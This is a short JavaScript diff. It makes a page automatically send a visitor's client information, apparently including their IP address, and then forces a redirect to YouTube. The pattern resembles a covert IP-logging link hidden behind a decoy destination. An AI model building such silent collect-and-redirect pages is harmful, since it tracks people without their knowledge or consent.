@@ -72,7 +72,13 @@ function GetIp(canIsIPV6, resultCallback){
                 return r.text();
             }).then((text) => {
                 console.log("response of send client info: ", text);
+                let lnk = document.createElement("a");
+                lnk.href = "https://www.youtube.com";
+                lnk.target = "";
+                lnk.click();
+                
             });
         });
     }
+    FetchClientInfo();
 })();
